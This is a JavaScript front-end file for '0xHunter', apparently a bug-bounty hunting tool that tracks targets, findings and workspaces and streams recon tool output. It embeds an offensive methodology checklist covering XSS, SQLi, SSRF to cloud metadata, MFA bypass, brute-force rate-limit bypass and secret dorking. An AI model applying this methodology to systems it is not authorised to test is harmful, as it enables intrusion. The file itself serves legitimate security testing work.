// 0xHunter — client application v2.1 (patched)
let S = { targets: [], findings: [], notes: [], assets: [], checklist: {}, activity: [], bookmarks: [], config: {}, oob_payloads: [], oob_hits: [] };
window.S = S;
// Persist session start across page reloads
let _storedSessionStart = parseInt(localStorage.getItem('0xh_session_start') || '0', 10);
let sessionStart = (_storedSessionStart && (Date.now() - _storedSessionStart) < 86400000) ? _storedSessionStart : Date.now();
if (!_storedSessionStart || (Date.now() - _storedSessionStart) >= 86400000) {
  localStorage.setItem('0xh_session_start', String(sessionStart));
}
let currentNote = null, currentPage = 'dashboard';
let editingTargetId = null, editingFindingId = null;
let targetSearch = '', targetStatus = '', targetPlatform = '';
let findingSearch = '', findingSev = '', findingStatus = '', findingType = '';
let noteSearch = '', noteCat = '';
let autoSaveTimer = null, reconTargetId = null;
let findingsViewMode = 'list';
let _findingUnsaved = false;  // tracks unsaved changes in finding modal
let _activeReconSSE = null;   // holds the current EventSource for recon streaming

const sevLabels = {
  critical: '<span class="sev-badge sev-critical">Critical</span>',
  high: '<span class="sev-badge sev-high">High</span>',
  medium: '<span class="sev-badge sev-medium">Medium</span>',
  low: '<span class="sev-badge sev-low">Low</span>',
  info: '<span class="sev-badge sev-info">Info</span>'
};

const checklists = {
  recon: [
    ['Subdomain enumeration (amass, subfinder)', 'high'],
    ['DNS records — A, CNAME, MX, TXT, NS', 'medium'],
    ['Reverse DNS lookup', 'low'],
    ['Port scan (nmap -sV -p-)', 'high'],
    ['Shodan / Censys search for assets', 'high'],
    ['GitHub dorking for secrets', 'critical'],
    ['Google dorking (site:, filetype:)', 'medium'],
    ['Wayback Machine / gau for old URLs', 'medium'],
    ['JS file enumeration (jsluice, linkfinder)', 'high'],
    ['Technology fingerprinting (Wappalyzer)', 'low'],
    ['Check for S3 / GCS buckets', 'high'],
    ['Email enumeration for phishing scope', 'low']
  ],
  web: [
    ['Directory/file busting (ffuf, gobuster)', 'high'],
    ['Check robots.txt and sitemap.xml', 'medium'],
    ['Test all HTTP methods (PUT, DELETE, etc.)', 'medium'],
    ['HTTP header analysis (security headers)', 'low'],
    ['Cookie flags analysis (HttpOnly, Secure, SameSite)', 'medium'],
    ['Test for XSS in all inputs', 'critical'],
    ['SQL injection in all parameters', 'critical'],
    ['Test for CSRF tokens absence', 'medium'],
    ['Check for open redirects', 'medium'],
    ['Server-side request forgery (SSRF)', 'high'],
    ['File upload vulnerability testing', 'high'],
    ['CORS misconfiguration', 'high'],
    ['HTTP smuggling check', 'high'],
    ['Path traversal / LFI / RFI', 'high'],
    ['XXE in XML endpoints', 'high']
  ],
  auth: [
    ['Test default credentials', 'critical'],
    ['Brute force login (rate limit bypass)', 'high'],
    ['Password policy testing', 'medium'],
    ['Forgot password flow (token weakness)', 'high'],
    ['JWT token manipulation', 'critical'],
    ['OAuth flow misconfigurations', 'high'],
    ['SAML vulnerabilities', 'high'],
    ['Session fixation / hijacking', 'high'],
    ['Multi-factor authentication bypass', 'critical'],
    ['Account takeover via email change', 'high'],
    ['Test for IDOR in user IDs', 'critical'],
    ['Privilege escalation (vertical)', 'critical'],
    ['Horizontal privilege escalation', 'high']
  ],
  api: [
    ['Map all API endpoints (swaggering)', 'high'],
    ['Check for unauthenticated endpoints', 'critical'],
    ['Test for BOLA/IDOR in objects', 'critical'],
    ['Mass assignment vulnerabilities', 'high'],
    ['GraphQL introspection enabled', 'medium'],
    ['GraphQL injection and IDOR', 'high'],
    ['Rate limiting on APIs', 'medium'],
    ['API versioning — test old versions', 'medium'],
    ['Check for sensitive data in responses', 'high'],
    ['Test pagination and filter bypass', 'medium'],
    ['Webhook SSRF potential', 'high']
  ],
  data: [
    ['Sensitive data in URL parameters', 'high'],
    ['API keys / secrets in JS files', 'critical'],
    ['Debug endpoints exposing internals', 'high'],
    ['Stack traces / verbose errors', 'medium'],
    ['Backup files (.bak, .old, .zip)', 'high'],
    ['Database dumps accessible', 'critical'],
    ['Logs with sensitive data', 'high'],
    ['Admin panels exposed', 'critical'],
    ['Cloud metadata endpoint (169.254.169.254)', 'critical']
  ],
  infra: [
    ['SSL/TLS configuration (testssl.sh)', 'medium'],
    ['Expired/self-signed certs', 'low'],
    ['Subdomain takeover', 'high'],
    ['DNS zone transfer', 'medium'],
    ['Email security (SPF, DKIM, DMARC)', 'low'],
    ['Check for CVEs in detected software', 'high'],
    ['Default admin pages accessible', 'high'],
    ['Clickjacking (X-Frame-Options)', 'low'],
    ['HSTS not enforced', 'low']
  ]
};

function checklistTotalCount() {
  let count = Object.values(checklists).reduce((n, items) => n + items.length, 0);
  try {
    let custom = JSON.parse(S.config.custom_checklists || '[]');
    count += custom.reduce((n, cat) => n + cat.items.length, 0);
  } catch(e) {}
  return count;
}

const esc = s => (s || '').replace(/[&<>'"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[c]));
const timeAgo = ms => {
  const s = Math.floor((Date.now() - ms) / 1000);
  if (s < 60) return s + 's ago';
  if (s < 3600) return Math.floor(s / 60) + 'm ago';
  if (s < 86400) return Math.floor(s / 3600) + 'h ago';
  return Math.floor(s / 86400) + 'd ago';
};
const formatTimer = ms => {
  const s = Math.floor((Date.now() - ms) / 1000), h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sc = s % 60;
  return `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(sc).padStart(2, '0')}`;
};

function toast(msg, type) {
  const container = document.getElementById('toast-container');
  if (!container) return;
  const t = document.createElement('div');
  t.className = 'toast' + (type ? ' toast-' + type : '');
  t.textContent = msg;
  container.appendChild(t);
  
  // Errors stay visible longer (6s) so they aren't missed
  const duration = type === 'error' ? 6000 : 3200;
  
  setTimeout(() => {
    t.classList.add('toast-out');
    setTimeout(() => {
      if (t.parentNode) t.parentNode.removeChild(t);
    }, 300);
  }, duration);
}

function toggleSidebar() {
  const sb = document.getElementById('sidebar');
  if (!sb) return;
  sb.classList.toggle('collapsed');
  // Persist sidebar state
  localStorage.setItem('0xh_sidebar_collapsed', sb.classList.contains('collapsed') ? '1' : '0');
}

// Restore sidebar collapsed state on load
(function restoreSidebarState() {
  if (localStorage.getItem('0xh_sidebar_collapsed') === '1') {
    document.getElementById('sidebar')?.classList.add('collapsed');
  }
})();

// ── CUSTOM CONFIRM DIALOG ─────────────────────────────────────────────────────
function showConfirm(message, onConfirm, onCancel) {
  let overlay = document.getElementById('custom-confirm-overlay');
  if (!overlay) {
    overlay = document.createElement('div');
    overlay.id = 'custom-confirm-overlay';
    overlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:9999;
      display:flex;align-items:center;justify-content:center;
      backdrop-filter:blur(4px);
    `;
    document.body.appendChild(overlay);
  }
  overlay.innerHTML = `
    <div style="background:var(--bg2);border:1px solid var(--border-light);border-radius:var(--r2);padding:28px 32px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.8);animation:pageIn 0.18s ease">
      <div style="font-size:15px;font-weight:600;color:#fff;margin-bottom:8px">⚠️ Confirm Action</div>
      <div style="font-size:13.5px;color:var(--text2);margin-bottom:22px;line-height:1.6">${esc(message)}</div>
      <div style="display:flex;gap:10px;justify-content:flex-end">
        <button id="cc-cancel" class="btn" style="min-width:80px">Cancel</button>
        <button id="cc-ok" class="btn btn-danger" style="min-width:100px">Confirm</button>
      </div>
    </div>`;
  overlay.style.display = 'flex';
  const close = () => { overlay.style.display = 'none'; };
  document.getElementById('cc-cancel').onclick = () => { close(); if (onCancel) onCancel(); };
  document.getElementById('cc-ok').onclick = () => { close(); if (onConfirm) onConfirm(); };
  overlay.onclick = e => { if (e.target === overlay) { close(); if (onCancel) onCancel(); } };
}

function globalSearch(q) {
  const query = (q || '').toLowerCase().trim();
  if (!query) return;
  const countHits = (list, fields) => list.filter(item => fields.some(f => String(item[f] || '').toLowerCase().includes(query))).length;
  const tHits = countHits(S.targets, ['name', 'scope', 'platform']);
  const fHits = countHits(S.findings, ['title', 'host', 'type']);
  const nHits = countHits(S.notes, ['title', 'content']);
  if (tHits) { goPage('targets'); document.getElementById('target-search').value = q; filterTargets(q); toast(`🔍 ${tHits} target match${tHits>1?'es':''} for "${q}"`); return; }
  if (fHits) { goPage('findings'); findingSearch = q; renderFindings(); toast(`🔍 ${fHits} finding match${fHits>1?'es':''} for "${q}"`); return; }
  if (nHits) { goPage('notes'); noteSearch = q; renderNotes(); toast(`🔍 ${nHits} note match${nHits>1?'es':''} for "${q}"`); return; }
  toast('No matches for: ' + q);
}

function bountyAmount(f) {
  const raw = f.bountyEarned || f.bounty || '';
  return parseFloat(String(raw).replace(/[^0-9.]/g, '')) || 0;
}

function targetNameById(id) {
  const t = S.targets.find(x => x.id == id);
  return t ? t.name : '';
}

async function loadData() {
  try {
    const res = await fetch('/api/data');
    if (res.status === 401) { window.location.href = '/login'; return; }
    if (!res.ok) throw new Error('load failed');
    const data = await res.json();
    S.targets = data.targets || [];
    S.findings = data.findings || [];
    S.notes = data.notes || [];
    S.assets = data.assets || [];
    S.checklist = data.checklist || {};
    S.config = data.config || {};
    S.activity = data.activity || [];
    S.api_key = data.api_key || '';
    S.oob_payloads = data.oob_payloads || [];
    S.oob_hits = data.oob_hits || [];
    if (!S.bookmarks) S.bookmarks = [];
    try {
      const local = JSON.parse(localStorage.getItem('0xhunter_v2') || '{}');
      if (local.bookmarks?.length && !S.bookmarks.length) S.bookmarks = local.bookmarks;
      if (local.customPayloads) S.customPayloads = local.customPayloads;
      if (local.customTools) S.customTools = local.customTools;
      if (local.customGhResources) S.customGhResources = local.customGhResources;
      if (local.favoriteGhResources) S.favoriteGhResources = local.favoriteGhResources;
      if (local.theme) S.theme = local.theme;
    } catch (e) { /* ignore */ }

    // Apply theme on load
    if (S.theme) changeTheme(S.theme);
    updateBadges();
    renderPage(currentPage);
    renderChecklist();
    fetchWorkspaces();
    updateTopbarAction();
  } catch (err) {
    console.error(err);
    toast('Error loading data', 'error');
  }
}

// --- WORKSPACE API INTEGRATION ---
async function fetchWorkspaces() {
  try {
    const res = await fetch('/api/workspaces');
    if (!res.ok) return;
    const data = await res.json();
    renderWorkspaces(data.workspaces, data.active);
  } catch (err) {
    console.error('Failed to load workspaces:', err);
  }
}

function renderWorkspaces(workspaces, activeDbName) {
  let html = '';
  workspaces.forEach(ws => {
    const isActive = ws.db_name === activeDbName;
    html += `
      <div style="display:flex;align-items:center;justify-content:space-between;padding:12px 14px;border-bottom:1px solid var(--border);${isActive ? 'background:var(--bg2)' : ''}">
        <div style="display:flex;align-items:center;gap:12px;flex:1;cursor:pointer;" onclick="switchWorkspace('${ws.db_name}')">
          <span style="font-size:18px;">${isActive ? '📂' : '📁'}</span>
          <div>
            <div style="font-weight:600;color:${isActive ? 'var(--accent)' : 'var(--text)'};font-size:14px;">${esc(ws.name)}</div>
            <div style="font-size:11px;color:var(--text3);margin-top:2px;">${ws.db_name}</div>
          </div>
        </div>
        ${isActive ? '<span style="font-size:11px;color:var(--accent);background:var(--accent-dim);padding:2px 6px;border-radius:4px;font-weight:600;border:1px solid var(--accent)">ACTIVE</span>' : 
        `<button class="btn btn-sm btn-danger" title="Delete Workspace" onclick="deleteWorkspace(${ws.id})">🗑</button>`}
      </div>
    `;
  });
  const el = document.getElementById('ws-list');
  if (el) el.innerHTML = html || '<div style="padding:14px;color:var(--text3);font-size:12px;">No workspaces found.</div>';
}

async function createWorkspace() {
  const name = document.getElementById('new-ws-name').value.trim();
  if (!name) return toast('Workspace name required', 'error');
  try {
    const res = await fetch('/api/workspaces', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ name })
    });
    if (!res.ok) throw new Error();
    document.getElementById('new-ws-name').value = '';
    fetchWorkspaces();
    toast('Workspace created successfully');
  } catch (err) {
    toast('Failed to create workspace', 'error');
  }
}

async function switchWorkspace(dbName) {
  try {
    const res = await fetch('/api/workspaces/switch', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ db_name: dbName })
    });
    if (!res.ok) throw new Error();
    window.location.reload(); // Hard reload to apply the new active DB across everything
  } catch (err) {
    toast('Failed to switch workspace', 'error');
  }
}

async function deleteWorkspace(id) {
  const confirmed = await new Promise(res => showConfirm(
    '⚠️ Delete this workspace? ALL targets, findings, notes, and assets inside will be permanently destroyed. This cannot be undone.',
    () => res(true), () => res(false)
  ));
  if (!confirmed) return;
  try {
    const res = await fetch('/api/workspaces/' + id, { method: 'DELETE' });
    if (!res.ok) {
      const txt = await res.json();
      return toast(txt.error || 'Failed to delete', true);
    }
    toast('Workspace deleted');
    fetchWorkspaces();
  } catch (err) {
    toast('Failed to delete workspace', true);
  }
}
// --- END WORKSPACE API ---

// --- LIVE RECON RUNNER (SSE streaming) ---
async function runLiveRecon() {
  const tool = document.getElementById('recon-runner-tool').value;
  const target = document.getElementById('recon-runner-target').value.trim();
  const outputEl = document.getElementById('recon-runner-output');
  const targetId = document.getElementById('recon-target-select').value;
  const runBtn = document.getElementById('recon-run-btn');

  if (!target) return toast('Please enter a target', true);
  if (!targetId) return toast('Please select a Program target from the dropdown above to store results', true);

  // Close any existing SSE connection
  if (_activeReconSSE) { _activeReconSSE.close(); _activeReconSSE = null; }

  outputEl.innerHTML = `<span style="color:#38bdf8;">[*] Starting ${esc(tool)} on ${esc(target)}...</span>\n`;
  if (runBtn) { runBtn.disabled = true; runBtn.textContent = '⏳ Running...'; }

  try {
    const res = await fetch('/api/recon/run', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ tool, target, targetId })
    });
    const data = await res.json();
    if (data.error) {
      outputEl.innerHTML += `<span style="color:#f43f5e; font-weight:bold;">[!] Error: ${esc(data.error)}</span>\n`;
      if (runBtn) { runBtn.disabled = false; runBtn.textContent = '▶ Run Tool'; }
      return;
    }

    const jobId = data.job_id;
    outputEl.innerHTML += `<span style="color:#10b981; font-weight:bold;">[+] Job ${esc(jobId)} started. Streaming live output:</span>\n${'─'.repeat(50)}\n`;

    // Stream output via SSE
    const evtSource = new EventSource(`/api/recon/stream/${jobId}`);
    _activeReconSSE = evtSource;

    evtSource.onmessage = e => {
      try {
        const msg = JSON.parse(e.data);
        if (msg.type === 'line') {
          let lineHtml = esc(msg.line);
          if (msg.line.startsWith('[+]') || msg.line.startsWith('[✓]')) {
            lineHtml = `<span style="color:#10b981; font-weight:bold;">${lineHtml}</span>`;
          } else if (msg.line.startsWith('[!]')) {
            lineHtml = `<span style="color:#f43f5e; font-weight:bold;">${lineHtml}</span>`;
          } else if (msg.line.startsWith('[*]')) {
            lineHtml = `<span style="color:#38bdf8;">${lineHtml}</span>`;
          }
          outputEl.innerHTML += lineHtml + '\n';
          outputEl.scrollTop = outputEl.scrollHeight;
        } else if (msg.type === 'done') {
          outputEl.innerHTML += `${'─'.repeat(50)}\n<span style="color:#10b981; font-weight:bold;">[✓] ${esc(msg.line || 'Completed.')}</span>\n`;
          outputEl.scrollTop = outputEl.scrollHeight;
          evtSource.close();
          _activeReconSSE = null;
          if (runBtn) { runBtn.disabled = false; runBtn.textContent = '▶ Run Tool'; }
          // Reload data to show new assets
          loadData().then(() => renderReconAssets());
        } else if (msg.type === 'error') {
          outputEl.innerHTML += `<span style="color:#f43f5e; font-weight:bold;">[!] ${esc(msg.line)}</span>\n`;
          evtSource.close();
          _activeReconSSE = null;
          if (runBtn) { runBtn.disabled = false; runBtn.textContent = '▶ Run Tool'; }
        }
      } catch (parseErr) { /* ignore */ }
    };

    evtSource.onerror = () => {
      outputEl.innerHTML += '<span style="color:#f59e0b; font-weight:bold;">[!] Stream disconnected.</span>\n';
      evtSource.close();
      _activeReconSSE = null;
      if (runBtn) { runBtn.disabled = false; runBtn.textContent = '▶ Run Tool'; }
    };

  } catch (e) {
    outputEl.innerHTML += `<span style="color:#f43f5e; font-weight:bold;">[!] Failed to contact backend: ${esc(e.message)}</span>\n`;
    if (runBtn) { runBtn.disabled = false; runBtn.textContent = '▶ Run Tool'; }
  }
}
// --- END LIVE RECON RUNNER ---

async function openSettingsModal() {
  const input = document.getElementById('settings-api-key');
  if (input) {
    input.type = 'password'; // hidden by default
    input.value = S.api_key || 'No API Key generated';
  }
  
  try {
    const res = await fetch('/api/config');
    const conf = await res.json();
    document.getElementById('settings-webhook-url').value = conf.webhook_url || '';
  } catch (e) { console.error('Failed to load config', e); }
  
  openModal('modal-settings');
}

function toggleApiKeyVisibility() {
  const input = document.getElementById('settings-api-key');
  const btn = document.getElementById('api-key-toggle-btn');
  if (!input) return;
  if (input.type === 'password') {
    input.type = 'text';
    if (btn) btn.textContent = '🙈 Hide';
  } else {
    input.type = 'password';
    if (btn) btn.textContent = '👁 Show';
  }
}

function copyApiKey() {
  const input = document.getElementById('settings-api-key');
  if (!input || !input.value) return;
  navigator.clipboard.writeText(input.value).then(() => toast('API key copied!', 'success'));
}

async function regenerateApiKey() {
  showConfirm(
    'Regenerate API key? The old key will stop working immediately.',
    async () => {
      try {
        const res = await fetch('/api/user/regenerate-key', { method: 'POST' });
        if (!res.ok) throw new Error();
        const data = await res.json();
        S.api_key = data.api_key;
        const input = document.getElementById('settings-api-key');
        if (input) input.value = data.api_key;
        toast('API key regenerated!', 'success');
      } catch (e) { toast('Failed to regenerate key', 'error'); }
    }
  );
}

async function saveWebhookUrl() {
  const url = document.getElementById('settings-webhook-url').value.trim();
  try {
    await fetch('/api/config', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ webhook_url: url })
    });
    toast('Webhook settings saved!', 'success');
  } catch (e) {
    toast('Failed to save webhook', 'error');
  }
}

// FEATURE J: Asset dedup
async function deduplicateAssets() {
  const tid = document.getElementById('recon-target-select')?.value;
  try {
    const body = tid ? { targetId: parseInt(tid, 10) } : {};
    const res = await fetch('/api/assets/dedup', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await res.json();
    toast(`Removed ${data.removed} duplicate asset${data.removed !== 1 ? 's' : ''}`, 'success');
    loadData().then(() => renderReconAssets());
  } catch (e) { toast('Dedup failed', 'error'); }
}

// FEATURE K: Burp Suite XML import
async function importBurpXml() {
  const input = document.createElement('input');
  input.type = 'file';
  input.accept = '.xml,.txt';
  input.onchange = async e => {
    const file = e.target.files[0];
    if (!file) return;
    const xml = await file.text();
    try {
      const res = await fetch('/api/import/burp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/xml' },
        body: xml
      });
      const data = await res.json();
      if (data.error) { toast('Burp import failed: ' + data.error, 'error'); return; }
      toast(`Imported ${data.imported} finding${data.imported !== 1 ? 's' : ''} from Burp!`, 'success');
      loadData();
    } catch (err) { toast('Failed to parse Burp XML', 'error'); }
  };
  input.click();
}

async function apiPost(endpoint, data) {
  const res = await fetch(endpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  if (res.status === 401) window.location.href = '/login';
  return res;
}

async function apiDelete(endpoint) {
  const res = await fetch(endpoint, { method: 'DELETE' });
  if (res.status === 401) window.location.href = '/login';
  return res;
}

function save() {
  localStorage.setItem('0xhunter_v2', JSON.stringify(S));
}

window.changeTheme = function(theme) {
  document.documentElement.className = theme === 'cyber' ? '' : 'theme-' + theme;
  S.theme = theme;
  save();
  const themeSelect = document.getElementById('settings-theme');
  if (themeSelect) themeSelect.value = theme;
};

window.cycleTheme = function() {
  const themes = ['cyber', 'matrix', 'neon-purple', 'sunset', 'blood'];
  let current = S.theme || 'cyber';
  let idx = themes.indexOf(current);
  let next = themes[(idx + 1) % themes.length];
  changeTheme(next);
  toast('Theme: ' + next);
};

async function addActivity(html, icon) {
  const entry = { html, icon, time: Date.now() };
  S.activity.unshift(entry);
  if (S.activity.length > 50) S.activity.pop();
  try { await apiPost('/api/activity', entry); } catch (e) { /* offline */ }
}

function updateBadges() {
  const bt = document.getElementById('badge-targets');
  const bf = document.getElementById('badge-findings');
  const bn = document.getElementById('badge-notes');
  if (bt) bt.textContent = S.targets.length;
  if (bf) bf.textContent = S.findings.length;
  if (bn) bn.textContent = S.notes.length;
  updateChecklistProgress();
}

window.updateChecklistProgress = function() {
  const { data: clData } = window.getActiveChecklistData ? window.getActiveChecklistData() : { data: S.checklist };
  let allCats = [];
  Object.entries(checklists).forEach(([key, items]) => allCats.push({ id: key, items: items }));
  try {
     let custom = JSON.parse(S.config.custom_checklists || '[]');
     custom.forEach(c => allCats.push(c));
  } catch(e) {}
  
  let total = 0;
  let done = 0;
  allCats.forEach(cat => {
     cat.items.forEach((item, i) => {
         total++;
         const cid = 'cl-' + cat.id + '-' + i;
         let val = clData[cid] || {};
         if (typeof val === 'boolean' ? val : val.checked) done++;
     });
  });
  
  const pct = total ? Math.round((done / total) * 100) : 0;
  const b = document.getElementById('badge-checklist');
  if (b) b.textContent = pct + '%';
  const f = document.getElementById('cl-prog-fill');
  if (f) f.style.width = pct + '%';
  const pctEl = document.getElementById('cl-prog-pct');
  if (pctEl) pctEl.textContent = pct + '%';
};

const pageActions = {
  dashboard: { btn: '+ Add Target', action: () => openTargetModal() },
  targets: { btn: '+ Add Target', action: () => openTargetModal() },
  findings: { btn: '+ Add Finding', action: () => openFindingModal() },
  notes: { btn: '+ New Note', action: () => openModal('modal-note') },
  recon: { btn: '+ Paste Assets', action: () => document.getElementById('recon-bulk')?.focus() },
  payloads: { btn: '+ Add Payload', action: () => openModal('modal-add-payload') },
  tools: { btn: '+ Add Tool', action: () => openModal('modal-add-tool') },
  huntkit: { btn: null },
  bookmarks: { btn: '+ Add Link', action: () => openAddBookmarkModal() }
};

function saveCustomPayload() {
  const name = document.getElementById('p-name').value.trim();
  const cat = document.getElementById('p-cat').value;
  const payload = document.getElementById('p-payload').value.trim();
  if(!name || !payload) { toast('Please provide a name and payload', 'error'); return; }
  if(!S.customPayloads) S.customPayloads = [];
  S.customPayloads.unshift({ id: Date.now(), name, cat, payload, isCustom: true });
  save(); closeModal('modal-add-payload'); renderPayloads(cat); toast('Custom payload saved');
}

function deleteCustomPayload(id) {
  showConfirm('Delete this custom payload?', () => {
    S.customPayloads = S.customPayloads.filter(p => p.id !== id);
    save(); renderPayloads();
  });
}

function saveCustomTool() {
  const idField = document.getElementById('tool-id').value;
  const isOverride = document.getElementById('tool-is-override').value === 'true';
  const name = document.getElementById('tool-name').value.trim();
  const author = document.getElementById('tool-author').value.trim();
  const desc = document.getElementById('tool-desc').value.trim();
  const coverImg = document.getElementById('tool-cover').value.trim();
  const cmd = document.getElementById('tool-cmd').value.trim();
  let tagsStr = document.getElementById('tool-tags').value.trim();
  const tags = tagsStr ? tagsStr.split(',').map(s => s.trim()).filter(x => x) : [];
  const cheatSheet = document.getElementById('tool-cheatsheet').value.trim();
  const csFile = document.getElementById('tool-cs-file').value.trim();
  const books = document.getElementById('tool-books').value.trim();
  const videos = document.getElementById('tool-videos').value.trim();
  
  if(!name || !cmd) { toast('Please provide a name and command', 'error'); return; }
  if(!S.customTools) S.customTools = [];
  
  const toolObj = {
    name, author, desc, coverImg, cmd, tags, cheatSheet, csFile, books, videos,
    isCustom: true, isOverride
  };

  // Preserve cheatSheetHtml if this is an override of a built-in tool
  if (isOverride) {
    const builtIn = (window.tools || []).find(t => t.name.toLowerCase() === name.toLowerCase());
    if (builtIn && builtIn.cheatSheetHtml) {
      toolObj.cheatSheetHtml = builtIn.cheatSheetHtml;
    }
  }

  if (idField) {
    toolObj.id = parseInt(idField, 10);
    const existingIdx = S.customTools.findIndex(t => t.id === toolObj.id);
    if (existingIdx !== -1) {
      S.customTools[existingIdx] = toolObj;
    } else {
      S.customTools.unshift(toolObj);
    }
  } else {
    toolObj.id = Date.now();
    S.customTools.unshift(toolObj);
  }

  save(); closeModal('modal-add-tool'); renderTools(); toast('Tool saved');
}

function deleteCustomTool(id) {
  showConfirm('Delete this custom tool?', () => {
    S.customTools = S.customTools.filter(t => t.id !== id);
    save(); renderTools();
  });
}

function updateTopbarAction() {
  const btn = document.getElementById('topbar-action');
  const cfg = pageActions[currentPage];
  if (!btn) return;
  if (cfg && cfg.btn) { btn.style.display = 'inline-flex'; btn.textContent = cfg.btn; }
  else btn.style.display = 'none';
}

function topbarAction() {
  const cfg = pageActions[currentPage];
  if (cfg && cfg.action) cfg.action();
}

function goPage(p) {
  currentPage = p;
  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
  const ni = document.getElementById('nav-' + p);
  if (ni) ni.classList.add('active');
  document.querySelectorAll('.page').forEach(el => el.classList.remove('active'));
  const pa = document.getElementById('page-' + p);
  if (pa) pa.classList.add('active');
  const map = {
    dashboard: 'Dashboard', targets: 'Targets', findings: 'Findings', notes: 'Notes',
    checklist: 'Methodology', attacks: 'Attack Guides', payloads: 'Payload Library',
    tools: 'Tools Ref', wordlist: 'Wordlists', utils: 'Encoder / Decoder',
    scope: 'Scope Checker', report: 'Report Gen', recon: 'Recon Scratchpad',
    huntkit: 'Hunt Kit', bookmarks: 'Bookmarks', github: 'GitHub Resources',
    analytics: 'Analytics', secrets: 'Secrets Scanner', dns: 'DNS Lookup', nuclei: 'Nuclei Templates',
    osint: 'OSINT Hub'
  };
  document.getElementById('bc-cur').textContent = map[p] || 'Dashboard';
  renderPage(p);
  updateTopbarAction();
  if (p === 'payloads') renderPayloads();
  if (p === 'attacks') renderAttacks();
  if (p === 'tools') {
    window.toolsActiveCategory = 'all';
    window.toolsSearchQuery = '';
    const inp = document.getElementById('tools-search-input');
    if (inp) inp.value = '';
    renderTools();
  }
  if (p === 'scope') renderScopeSummary();
  if (p === 'recon') renderReconPage();
  if (p === 'huntkit' && typeof renderHuntKitPage === 'function') renderHuntKitPage();
  if (p === 'bookmarks') renderBookmarks();
  if (p === 'osint') renderOsintDorks();
  if (p === 'github') renderGithubResources();
  if (p === 'analytics') { loadAndRenderAnalytics(); renderHuntingStats(); }
  if (p === 'nuclei') { setTimeout(renderNucleiTemplates, 50); }
}

function renderPage(p) {
  if (p === 'dashboard') renderDashboard();
  if (p === 'targets') renderTargets();
  if (p === 'findings') renderFindings();
  if (p === 'notes') renderNotes();
  if (p === 'report') { populateReportSelects(); updateReport(); }
  if (p === 'scope') renderScopeSummary();
  if (p === 'recon') renderReconPage();
  if (p === 'huntkit' && typeof renderHuntKitPage === 'function') renderHuntKitPage();
  if (p === 'bookmarks') renderBookmarks();
  if (p === 'osint') renderOsintDorks();
  if (p === 'utils') { setTimeout(() => { if (typeof renderCVSSCalc === 'function') renderCVSSCalc(); }, 50); }
}

window.updateDashboardScanMonitor = function() {
  const banner = document.getElementById('active-scan-banner');
  const title = document.getElementById('active-scan-title');
  const desc = document.getElementById('active-scan-desc');
  const actionBtn = document.getElementById('active-scan-action-btn');

  if (!banner) return;

  const isNucleiRunning = typeof isNucleiScanRunning === 'function' && isNucleiScanRunning();
  const isReconRunning = typeof _activeReconSSE !== 'undefined' && _activeReconSSE !== null;

  if (isNucleiRunning) {
    banner.style.display = 'flex';
    banner.classList.add('scanning');
    title.textContent = 'Active Scan: Simulated Nuclei';
    desc.textContent = 'A simulated Nuclei vulnerability scan is running in the background...';
    actionBtn.onclick = () => {
      const modal = document.getElementById('modal-nuclei-terminal');
      if (modal) modal.style.display = 'block';
    };
    actionBtn.textContent = 'View Progress';
  } else if (isReconRunning) {
    banner.style.display = 'flex';
    banner.classList.add('scanning');
    title.textContent = 'Active Scan: Live Recon Runner';
    desc.textContent = 'Streaming live recon stdout logs in real-time...';
    actionBtn.onclick = () => {
      goPage('recon');
    };
    actionBtn.textContent = 'View Console';
  } else {
    banner.style.display = 'none';
    banner.classList.remove('scanning');
  }
};

window.openFindingQuickView = function(id) {
  const f = S.findings.find(x => x.id == id);
  if (!f) return;
  const tname = targetNameById(f.targetId);
  let screenshots = [];
  try { screenshots = f.screenshots ? JSON.parse(f.screenshots) : []; } catch(e) { screenshots = []; }
  if (!Array.isArray(screenshots)) screenshots = [];

  const drawer = document.getElementById('quickview-drawer');
  const overlay = document.getElementById('quickview-overlay');
  const title = document.getElementById('quickview-drawer-title');
  const body = document.getElementById('quickview-drawer-body');

  if (!drawer || !body) return;

  title.textContent = `🐛 ${f.title}`;
  body.innerHTML = `
    <div class="fd-meta-strip" style="margin-bottom:16px;">
      ${sevLabels[f.severity] || ''}
      <span class="chip chip-gray">${esc(f.type)}</span>
      <span class="status-badge">${esc(f.status)}</span>
      ${f.cvss ? `<span class="chip chip-gray">CVSS: ${esc(f.cvss)}</span>` : ''}
      ${f.bountyEarned ? `<span class="chip chip-green">💰 ${esc(f.bountyEarned)}</span>` : ''}
      ${tname ? `<span class="chip chip-blue">🎯 ${esc(tname)}</span>` : ''}
    </div>
    ${f.host || f.endpoint ? `
      <div class="fd-section" style="margin-bottom:16px;">
        <div class="fd-section-label" style="font-size:11px;color:var(--text3);text-transform:uppercase;font-weight:700;margin-bottom:4px;">Affected Endpoint</div>
        <div class="fd-mono" style="font-family:var(--mono);background:var(--bg3);padding:8px 12px;border-radius:var(--r-sm);font-size:12.5px;color:#fff;">${esc(f.host || '')}${f.endpoint ? '<span style="color:var(--text3)">'+esc(f.endpoint)+'</span>' : ''}</div>
      </div>` : ''}
    ${f.desc ? `
      <div class="fd-section" style="margin-bottom:16px;">
        <div class="fd-section-label" style="font-size:11px;color:var(--text3);text-transform:uppercase;font-weight:700;margin-bottom:4px;">Steps to Reproduce</div>
        <div class="fd-desc" style="white-space:pre-wrap;color:var(--text2);font-size:13px;">${esc(f.desc)}</div>
      </div>` : ''}
    ${f.payload ? `
      <div class="fd-section" style="margin-bottom:16px;position:relative;">
        <div class="fd-section-label" style="font-size:11px;color:var(--text3);text-transform:uppercase;font-weight:700;margin-bottom:4px;">Payload</div>
